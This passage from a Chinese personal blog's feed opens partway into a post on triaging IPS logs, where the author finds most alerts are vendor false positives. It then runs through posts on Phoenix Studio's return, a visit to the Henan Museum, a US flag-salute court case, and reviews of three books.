<p>第二步，多维度统计。思路是，统计记录的攻击触发规则top10，用以展示攻击手段哪种最多。统计全部攻击中源地址的top10，展示攻击者的排序列表。统计全部攻击中目的地址的top10，展示哪些业务系统或内网主机成为靶子最多。</p>
<p>这里用到了一些excel技巧。第一个是多维度排序。先按规则id降序，同时按源地址ip降序，后面再处理数据就方便多了。接着，最重要的功能就是，分类汇总。要统计触发规则top10，就得先统计每个规则被触发次数。那就按照规则id分类，按其他某列数据汇总。excel会自动把这个规则id一共出现次数全部统计出来。最后，把结果拷贝到另外一张sheet里降序，top10就出来了。</p>
<p>做完这三项统计后，看着结果我就纳闷了。</p>
<p>攻击源地址几乎95%都是内网地址。也即，从现在的日志来看，绝大部分攻击都是内网发起的、针对互联网服务器的各类注入、xss、溢出。这显然与网络实际状况有误。一个企业的互联网出口，不可能内网黑客数量远超出互联网的黑客数量，这有违常识。当然不排除说，内网主机中马了，成肉鸡后被人控制发起攻击。这种情况应该存在，但决不可能成主流。</p>
<p>显而易见，日志有大量误报存在。现在面对的困难是，误报远远超出我的想象，漏报隐藏在庞大的数据流中遥不可及。</p>
<p>分析误报，从两个角度入手。第一，分析攻击次数最多的策略和数据包；第二，分析这些攻击的源地址与目的地址。</p>
<p>TOP1的攻击是针对某邮箱系统的溢出攻击。这种邮箱我们企业内根本就没有使用，误报的可能性很高。再看源地址，基本都是内网某两个段的地址。目的地址只有一个外网ip。也就是说，内网某个部门的员工们，大量攻击一个外网指定的邮件服务器。不合逻辑啊。更有可能的是，他们使用这台邮件服务器收发mail，但被误报成了攻击。</p>
<p>为了证实，先找到用户确认他们是否频繁使用某外网邮件服务器。结果，这个段的用户是驻在公司范围的某兄弟企业的员工，他们每天都要访问自己公司的邮件服务器。</p>
<p>证明误报，不能只靠逻辑，还得靠数据。从设备上抓取这条规则拦截的数据包，用wireshark打开，逐个TCP包分析，并没有看到有攻击特征。为了确认，我只好把数据发给原厂研发人员。一天后结果出来了，厂商确认这条策略制订有问题，属于误报，下次更新特征库就能解决这个问题。</p>
<p>按照这个思路我分析了top12的攻击，结果11条都是误报。当时我就默默无语两眼泪了，这特么是什么特征库啊！更可气的是，有些误报让人觉得非常低级。</p>
<p>比如，F5为了探测背后的服务器是否存活，会定时发ICMP包给他们。这些包都被当作了攻击。理由是，发包频率有问题。尼玛，你们难道就不知道有种负载均衡叫F5吗？你们难道就不知道企业用F5很多吗？分析下F5发的包和攻击包有什么区别，很难吗？</p>
<p>再比如，记录到有大量数据库文件探测攻击。用wireshark打开HTTP包，然后跟踪他的TCP流，能看到具体的get信息。原来是请求的内容里，出现了mdb这三个字符。也就是说，特征库判断是否存在数据库文件探测攻击的标准简单到了，请求里有没有这三个字母。要知道在正常的http请求里，字符随即出现，这三个字符同时出现是再正常不过的事情了，你们能不能做做模式匹配或者正则表达式啊。</p>
<p>更多的情况是，内网用户正常看网页时，有些互联网网站代码不规范，比如在http头里出现了javascrip:void（0），或者select，设备就会认定出现了 xss或sql注入。如此简单而白痴的判断，让我的心碎了一地。别理我，我想静静，也别问静静是谁……</p>
<p>回到运维，处理这些大量的误报，思路有几种。</p>
<p>第一，反馈原厂，修改特征库，减少误报。</p>
<p>第二，把误报极高的规则不再记录日志。</p>
<p>第三，内网访问外网的流量，匹配规则进行优化，不再启用类似注入、xss这些web类规则。</p>
<p>现在的问题是，区域售后工程师技术能力跟不上。小伙子态度还不错，但对各类web攻击、木马特性研究太浅，沟通起来成本太高。更不要提给客户一些有价值的优化建议了。传统安全厂商对售后的认识，大多还停留在处理下设备故障、调试下设备功能、抓包以供研发人员研究等等诸如此类的基础工作上。而不是如何引导帮助客户，充分把设备用起来，用好，体现产品的价值。这种思路不扭转，传统安全厂商还是只能卖盒子。</p>
<p>售后工程师说，他服务的其他本地客户绝大多数在设备上线以后就不再操心了，策略只要管用，那就让他静静的在网络出口当好“保安”吧。这一方面和客户的技术能力、对安全运维的态度有关，但更重要的是厂商的引导与支持。越不引导，客户就越会感觉盒子没用。价值越体现不出来，厂商的生意就越难做。</p>
<p>当然，我也不能对刚毕业的售后工程师苛责太多，看着他，不免想起几年前的自己。那时的我，和他做一模一样的工作，处理几乎一模一样的问题，也从来没想过售后还能做点别的，还能为客户带来什么其他的价值。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这篇东西主要谈论传统行业公司的安全部门，在日常运维中针对IPS可能遇到的问题，以及个人经验总结。和互联网企业的安全运维并非一个范畴的东西，和传统企业的IT运维有明星区别。&lt;/p&gt;
    
    </summary>
    
      <category term="安全相关" scheme="http://www.lewisec.com/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="IPS" scheme="http://www.lewisec.com/tags/IPS/"/>
    
      <category term="日志" scheme="http://www.lewisec.com/tags/%E6%97%A5%E5%BF%97/"/>
    
      <category term="漏报" scheme="http://www.lewisec.com/tags/%E6%BC%8F%E6%8A%A5/"/>
    
      <category term="误报" scheme="http://www.lewisec.com/tags/%E8%AF%AF%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>凤凰工作室回归</title>
    <link href="http://www.lewisec.com/2015/07/05/phoenixstudio/"/>
    <id>http://www.lewisec.com/2015/07/05/phoenixstudio/</id>
    <published>2015-07-05T09:57:31.000Z</published>
    <updated>2016-08-07T15:15:26.071Z</updated>
    
    <content type="html"><![CDATA[<p>最近比较令人激动的消息，就是凤凰工作室回归了！</p>
<p>没错，就是当初出品TheWorld 世界之窗浏览器的那个凤凰工作室。</p>
<p>至今我都认为，TheWorld是PC平台最好用的浏览器，没有之一。几年前360为了争夺入口，收购了凤凰工作室。团队所有成员全部成了360的员工，稍早一点的360全系列浏览器都是出自他们之手。</p>
<p>后来有几位离开数字公司单独发展了。其中xiaoc成立团队开始做机顶盒的遥控器产品，名字叫做<a href="http://www.wukongtv.com/" target="_blank" rel="external">悟空遥控器</a>，发展的还不错。这次凤凰工作室原来的老大谢震宇带领另外一些成员恢复了“凤凰工作室”的名称，不仅有产品，还有<a href="http://www.phoenixstudio.org/filemanager/cn/" target="_blank" rel="external">官网</a>和<a href="http://bbs.phoenixstudio.org/" target="_blank" rel="external">论坛</a>。</p>
<p>这次，凤凰工作室的主打产品是安卓系统下的文件管理器，名字叫超卓。我在魅族手机上装了体验了几次，界面简单，功能还比较初级。毕竟是1.0beta版本，还不能要求太高。</p>
<p>另外，工作室未来还会发布安卓下的浏览器产品，名字叫星尘浏览器，希望这款产品可以继承TheWorld浏览器的优良传统，小巧，好用！</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近比较令人激动的消息，就是凤凰工作室回归了！&lt;/p&gt;
&lt;p&gt;没错，就是当初出品TheWorld 世界之窗浏览器的那个凤凰工作室。&lt;/p&gt;
&lt;p&gt;至今我都认为，TheWorld是PC平台最好用的浏览器，没有之一。几年前360为了争夺入口，收购了凤凰工作室。团队所有成员全部成
    
    </summary>
    
      <category term="IT点滴" scheme="http://www.lewisec.com/categories/IT%E7%82%B9%E6%BB%B4/"/>
    
    
      <category term="TheWorld" scheme="http://www.lewisec.com/tags/TheWorld/"/>
    
      <category term="凤凰工作室" scheme="http://www.lewisec.com/tags/%E5%87%A4%E5%87%B0%E5%B7%A5%E4%BD%9C%E5%AE%A4/"/>
    
      <category term="浏览器" scheme="http://www.lewisec.com/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
      <category term="超卓" scheme="http://www.lewisec.com/tags/%E8%B6%85%E5%8D%93/"/>
    
  </entry>
  
  <entry>
    <title>河南博物院的“穿越之物”</title>
    <link href="http://www.lewisec.com/2015/06/15/%E6%B2%B3%E5%8D%97%E5%8D%9A%E7%89%A9%E9%99%A2%E7%9A%84%E2%80%9C%E7%A9%BF%E8%B6%8A%E4%B9%8B%E7%89%A9%E2%80%9D/"/>
    <id>http://www.lewisec.com/2015/06/15/河南博物院的“穿越之物”/</id>
    <published>2015-06-15T03:32:39.000Z</published>
    <updated>2016-08-07T15:02:23.989Z</updated>
    
    <content type="html"><![CDATA[<p>去西安玩，逛了逛陕西博物馆。去苏州玩，第一站就是苏州博物馆。可家门口的河南博物院我还从来没去过，说来还真有点遗憾。趁周末，补上了这一课。</p>
<p>河南作为考古大省，也是文物大省，在河南省内挖掘到的文物大多陈列在省博物院，特别珍贵的国宝级文物转移去了国家博物院。覆盖的历史时期从夏商时期一直延绵到清朝。从文物数量和质量上，河南博物院都不输于任何一座省级博物馆。</p>
<p>河南博物院地处郑州市北二环路上，也即农业路上。原来，坐BRT公交车去那里很方便，但最近农业路全线都在建设快速高架桥，路中间全部是正在施工的工地，通行能力只有正常时的1/3，很多公交车也都改了线，外地朋友建议还是打车去比较靠谱。</p>
<p>在大门的东侧人工窗口或者自助机都可以凭身份证可以免费领取门卡，我去的时候是下午一点，整个博物院里人都很少，图的就是个清净。进入大厅以后，可以花费100元请导游讲解，也可以请义务讲解员，因为人太少，我还是租了个讲解器比较方便。</p>
<p>从第一展厅开始就是新旧石器时代的古猿人留下的石器工具之类，和大多数博物馆比较类似，按时期划分了展厅。</p>
<p>我不写流水账，这次玩儿个标题党，专门挑几件有意思的，让我们后人惊叹“原来古人还能造出这样器物”的文物来说说，这几件东西颇有点让人感觉好似穿越时代一般，挺有趣。</p>
<p>先说第一件，距今5、6000千年前的，新时期时代的陶罐。</p>
<p><img src="http://ob7tq8bas.bkt.clouddn.com/X.jpg" alt="" title="X"></p>
<p>这件陶罐最与众不同的，就是罐体上面古人手工制作了一个形似英文字母“X”的纹饰。我还记得小时候学数学第一次老师教着写方程式中的X，就是左边画半个圆圈，右边再画半个圆圈，闹了半天这是流传了5000年的写法啊，瞬间有一种“老祖宗真有文化”的幽默感，别说话，你感受一下 :-p</p>
<p>第二件，是春秋时期的铜合页。</p>
<p><img src="http://ob7tq8bas.bkt.clouddn.com/heye.jpg" alt="" title="heye"></p>
<p>记得在陕西博物馆曾看到过秦朝时制作的大量使用复杂机械的铜马车，河南博物院这件合页，可要比始皇时候的铜车还要早几百年。那时候的古人居然就已经可以制作出这么精细的合页来，不得不赞叹能工巧匠的高超！</p>
<p>第三件，是汉代的母子孙印章。</p>
<p><img src="http://ob7tq8bas.bkt.clouddn.com/yin.jpg" alt="" title="yin"></p>
<p>所谓母子孙印章，就是一套印章，由三枚构成，每一枚都有单独的设计和内容。最小的印，恰好可以安放在中间印章的空腔内，而组合好的这两枚印章，又能完整的放入最大那枚印章里面，组成一个完整整体，好像祖孙三代在一起故而得名。</p>
<p>每一枚印章制作都非常精细，汉代时的印章主要还是文件外头配合封泥用来在做文件密封之用，防止文件传输过程中被人私自打开，安全行业叫“中间人攻击”，所以那时候的印章普遍制作很小且十分精美。</p>
<p>第四件，是两件一组啦，白菜和萝卜！</p>
<p><img src="http://ob7tq8bas.bkt.clouddn.com/luobo.jpg" alt="" title="xiangya1"></p>
<p><img src="http://ob7tq8bas.bkt.clouddn.com/baicai.jpg" alt="" title="xiangya2"></p>
<p>看着像真的吧？其实是用象牙雕刻而成的。大家都知道慈禧最喜欢的翡翠白菜，却大多不知道清朝还有类似的象牙萝卜和象牙白菜。只不过受限于象牙本身没有翡翠原石那么大，这两件宝贝的体积相对小了一些，知名度也小了许多。但这两件在雕刻技巧和制作精良方面，都和慈禧的翡翠白菜有异曲同工之妙。上面还都雕刻有小虫，连虫子腿上的肌理都分毫毕现，几乎人人来到这两件文物前，都会忍不住感慨不已。</p>
<p>最后一件文物，还是和信仰有关。</p>
<p>唐代的贝叶佛经！</p>
<p><img src="http://ob7tq8bas.bkt.clouddn.com/beiyejing.jpg" alt="" title="fo"></p>
<p>西安大慈恩寺里保存有玄奘法师从印度带回来的佛经，就是这种最原石的、刻在贝叶上的经文，而不是《西游记》里演的印刷在白纸上的佛经，掉水里还得在晒经石上晒干。古印度还没那么发达，佛经都是刻在植物叶子上的，而且都是梵文。</p>
<p>只是不知道河南博物院保存的这片贝叶经，是不是玄奘法师带回来的那批。</p>
<p>最后买一送一，来个纪录片。这也是我最近正在看的一部专门将郑州考古发现的纪录片：<a href="http://www.iqiyi.com/a_19rrhazyo5.html" target="_blank" rel="external">《商之都》</a></p>
<p>热情的河南人民欢迎各位！</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去西安玩，逛了逛陕西博物馆。去苏州玩，第一站就是苏州博物馆。可家门口的河南博物院我还从来没去过，说来还真有点遗憾。趁周末，补上了这一课。&lt;/p&gt;
&lt;p&gt;河南作为考古大省，也是文物大省，在河南省内挖掘到的文物大多陈列在省博物院，特别珍贵的国宝级文物转移去了国家博物院。覆盖的历
    
    </summary>
    
      <category term="七零八落" scheme="http://www.lewisec.com/categories/%E4%B8%83%E9%9B%B6%E5%85%AB%E8%90%BD/"/>
    
    
  </entry>
  
  <entry>
    <title>宗教自由的极端例子</title>
    <link href="http://www.lewisec.com/2015/04/27/religious-freedom/"/>
    <id>http://www.lewisec.com/2015/04/27/religious-freedom/</id>
    <published>2015-04-27T13:47:39.000Z</published>
    <updated>2016-08-07T15:15:57.831Z</updated>
    
    <content type="html"><![CDATA[<p>最近在读一本很厚的大部头书，《美国宪政历程：影响美国的25个司法大案》。正所谓知己知彼，百战不殆嘛，只有多了解美帝的过去和现在，才能更好的建设社会主义伟大祖国，嗯嗯。</p>
<p>因为还没有读完，所以今天不写全书的书评，只写一个刚刚读到的很有意思的点。</p>
<a id="more"></a>
<p>昨晚读到第13章，《当爱国主义碰上宗教和言论自由》，本章是三个有关国旗、爱国主义教育与民众的宗教自由和言论自由发生冲突时，美帝过去的判例。</p>
<p>简单说，1936年的美帝，宾夕法尼亚州的一所小学要求学生每天向星条旗致敬，并诵读《效忠誓词》。这种场景其实你我都不陌生，谁小的时候没经历过类似的场景呢？咱们小的时候争着抢着入了少先队，光荣的戴上了国旗的一角，鲜红的红领巾飘扬在胸口时，面向国旗致敬，是多么崇高而又自然的事情啊。可美帝则不然，有这么一群人，他们是耶和华见证会的信徒。换白话说，就是基督教的一个流派，但这些信徒们认为只有耶和华是真神，拒绝向上帝以外的任何偶像崇拜，哪怕是圣子耶稣。有俩思想道德败坏的小学生恰好自幼跟随父母信了这个教派，他们认为学校强迫他们向国旗这个偶像致敬是有违自己的宗教信仰的，所以坚决不从。学校一看，顿时恼了，要么老老实实当乖宝宝，要么你们就退学回家。</p>
<p>就这样，两个被退学的孩子的老爹，开始在律师的帮助下状告学校侵犯了他们的宗教自由。案子一级一级的上诉，一直告到了美国最高法院。很不幸，最高法院最后判学校胜诉，考虑到当时即将爆发的世界大战，最高法院的大法官们认为必要的爱国主义教育是正确的，而宗教，应该表现出包容的一面。</p>
<p>没想到的是，民众对大法官的判决十分不满，一家报纸甚至说：“如果爱国情操需要依靠违反人们最基本的宗教自由来培养的话，爱国情操就不再是高尚的东西，而是一种通过法律灌入我们喉咙的东西。”</p>
<p>看到这里我不禁笑了出来，美帝的老百姓也太傻老帽了，小胳膊拧不过大腿不说，居然那“迷信”的东西去和爱国主义教育抗衡，这不是美奸吗？这不是卖国贼吗？中国真要打过去了这帮人说不定第一个为我雄赳赳的解放军带路啊！而且，这种事情永远也不可能在中国发生啊，看看我们伟大的祖国，记得有一张照片曾这样展现：在一座佛教寺院里挂着一个条幅，上写：“没有共产党，就没有如来佛！”这是什么样的爱国热情？这是什么高度的政治觉悟？岂能是美帝百姓所能企及的高度！哼哼。你们呀，图样图拿衣服！</p>
<p>类似的案子在美国继续上演，民众的呼声也越来越高，最高法院的法官们意识到了自己曾犯下的错误有多严重。终于在1943年，另一起类似的案子打到了最高法院，这次，大法官们选择勇于认错，勇于改错。他们做出了完全相反的判罚，认定学校败诉。注意，这也是美国最高法院历史上立场改变最快，也是最彻底的一次。这一次大法官们不再纠结了宗教自由和爱国主义的麻烦，他们换成了从言论自由的角度解释这个问题，“如果维持强制性向国旗致敬的话，我们就必须说明这是公权力强迫个人说他并不想说的话。”显然，这样就有违言论自由的基本权利。</p>
<p>大法官最后说的一段话很有意思，我摘录一下：“如果在我们宪法的星空上还有一颗不变的星辰，那就是，无论是在政治、民族主义、宗教还是其他舆论问题上，没有任何官员，不管其职位高低，都无权决定什么是正确的，也无权用言论或行动来强迫公民表达他们的信念。”“强制表达出来的言辞，除了自欺欺人外，并不能证明忠诚。对国家的热爱必须发自自主的心灵和自由的心智。”</p>
<p>王小波在《沉默的大多数》里，曾经发明了一个词叫“话语捐”，意思是明知道自己说的是假的，但为了满足别人，满足上面，也不得不说。这些话，就是话语捐。</p>
<p>至于B福建之流，话语捐没交，活该落得个如此下场。</p>
<p>好了，只说这么多。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在读一本很厚的大部头书，《美国宪政历程：影响美国的25个司法大案》。正所谓知己知彼，百战不殆嘛，只有多了解美帝的过去和现在，才能更好的建设社会主义伟大祖国，嗯嗯。&lt;/p&gt;
&lt;p&gt;因为还没有读完，所以今天不写全书的书评，只写一个刚刚读到的很有意思的点。&lt;/p&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://www.lewisec.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>聊聊最近看的三本书</title>
    <link href="http://www.lewisec.com/2015/03/21/two-books/"/>
    <id>http://www.lewisec.com/2015/03/21/two-books/</id>
    <published>2015-03-21T08:57:14.000Z</published>
    <updated>2016-08-07T15:19:10.206Z</updated>
    
    <content type="html"><![CDATA[<p>最近主要在看三本书，《鱼羊野史·第一卷》，《台湾，请听我说》，《我的抗战》。</p>
<a id="more"></a>
<p>先说《鱼羊野史》，豆瓣评分8分，主要得分是4。我给的评分也是4。</p>
<p>从内容来说，很有趣，把历史上的一些趣事、轶闻按照日期一天一天的展开来讲。高晓松一向不喜欢正儿八经地说正儿八经的历史，夹带私货是他的习惯，写书也一样。即便是北宋灭亡后徽钦二帝的事儿，他也喜欢从小细节表达自己的看法。从这个角度来说，这样的书其实挺适合现在快节奏的生活。没有长篇大论，没有枯燥的罗列史料，一件事长的写一页多，短的就是一段话。无论是通勤路上，还是睡前床头，不用担心阅读被打断的烦恼。轻松，是这本书的最大特点。</p>
<p>为什么不给5分呢？两方面。</p>
<p>一方面，作者在描写某一历史事件时，太过发散了。例如，在1月3日这天，高晓松写的第一件事是《海国图志》出版。我以为他会聊聊这本书的内容，再要么就聊聊作者的趣事，最不济也要扯两句那个时代的背景吧。谁知道高晓松从《海国图志》聊到林则徐，因为这本书的原作者据说是林则徐，魏源不过是copy了林大人的内容然后出版了。接着从林则徐又聊到盗版的问题。顺着版权问题，突然一脚蹦到了美国内战，据说南北内战时候南方统帅罗伯特·李不愿把西点军校训练新兵的一本书拿来用，理由是该书作者是现在是北军的人，没有授权！我了个去啊，高晓松这一路从大清国直接扯到了地球那半拉的美国，你让读者怎么跟得上你的思路！</p>
<p>这种“散”，在本书的前三分之一尤其明显。不知是作者有意为之以显示博学，还是内容储备有点贫乏导致。</p>
<p>另一方面，这本书的很多内容其实都在高晓松的两档视频节目《晓说》、《晓松奇谈》里面讲述过。当然，这不是批评本书的理由。我只想说，如果你是高晓松的粉，或者是这两档还不错的视频脱口秀节目的粉，那这本40块钱的书其实可以不用买了。</p>
<p>再来说《台湾，请听我说》</p>
<p>豆瓣评分8.6，得分最多是5分，不多见的高分书。但我只能给个3分的评价。</p>
<p>这是一本14个台湾人的口述历史合集。作者采访了不同行业的台湾人，讲述从1949到现在的私家历史，经口述人审订后结集出版。选取的对象有作家、艺术家、企业创始人甚至民运人士。作者也想从不同类型的人身上挖掘出大历史大背景下的寻常台湾百姓的小历史，立意还是很棒的。</p>
<p>但是，问题出在，讲述内容不够聚焦，主题太过杂乱。另一本口述历史《我的抗战》则不然，完全聚焦在八年抗战的历史和事件，选取的讲述人也都是参加抗战的不同类型的人。</p>
<p>《台》的口述史不仅发散，而且篇幅短，跨越时间长。基本上是十来页讲述半个世纪的内容，还要有自己各自的重点要突出，这种口述方式导致的最大问题就是，空话和概述太多了，内容深度完全达不到预期。</p>
<p>而有些企业创始人的讲述内容，基本上又成了这个企业如何创建如何发展的企业史，读起来索然无味。</p>
<p>这本书给我最重要的受益，是从百姓的角度看待台湾的族群问题。这是最大收获。</p>
<p>从我读过的其他台湾相关书籍里面可以看出族群问题背后的历史原因和社会原因，以至于在较长时间内我都一直认为，族群问题的最大原因是不同时期移民到这座小岛的不同民族的人群之间，由于文化差异、三观差异、利益纠纷导致的社会现象。恰恰忽略了政治这个极为重要的背后原因。</p>
<p>从李登辉开始直到民进党领导人，都有意利用族群问题这个台湾岛内最大的话题制造事端，甚至有意挑起和激化族群问题，以达到自己不可告人的政治目的。民进党执政那几年最为突出，由族群问题演化成了身份认同问题，最极端的就是台～～独思潮的愈演愈烈。以至于在岛内，“你认同哪个国家”、“你认同你是哪个身份”、“爱不爱台湾”这种问题成为每个台湾人都不可回避的问题。回想起来，这和十年浩劫时候的挑边站队，是不是有点神似了呢？</p>
<p>下面要说的话，不可直言，只能意会。顺着台湾岛内这种族群分裂矛盾往下想，我们大陆同胞是不是也起到了某种特殊的作用呢？想想我们从小受的宣传，对于台湾，我们用的最多的词，是“解放”。而我们从来也没有想过那些“生活在水深火热”中的同胞，是怎么想的，是什么态度。我们想当然的认为，他们需要我们，需要祖国母亲的怀抱，需要被拯救。上世纪末，戴大框眼镜的leader指导的那场飞弹表演，会给本就身份认同很迷茫的同胞们什么感触？他们看到从祖国母亲发来的不是温暖，而是飞弹的时候，会是什么样的心态？很难说这些事情和现状之间，会是什么样的关联。</p>
<p>最后说说《我的抗战Ⅰ》，豆瓣评分8.6，又是一本高分作品。但我给出的评价仍旧是3。</p>
<p>上面提到了，这是一本很标准的有关抗日战争的口述史。也是崔永元制作的同名纪录片的文字版本。仔细想想，应该是从崔开始，我们才接触并认识了口述历史这种口口相传的“故事”也能有如此大的价值。从而让大家意识到了保护口述历史的重要。从这个角度说，崔，和这本书，这部片，功不可没。</p>
<p>这本书的最大问题是，如果你看了纪录片的话，完全就没有必要买书看了。因为内容和纪录片是一模一样的。从展现手法来说，我反倒觉得，纪录片的精美要远超过文字的记述。</p>
<p>所以我给的3分，不是指内容，而是说买书这件事。</p>
<p>这一个来月就看了这三本书，失望多于希望吧。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近主要在看三本书，《鱼羊野史·第一卷》，《台湾，请听我说》，《我的抗战》。&lt;/p&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://www.lewisec.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
</feed>
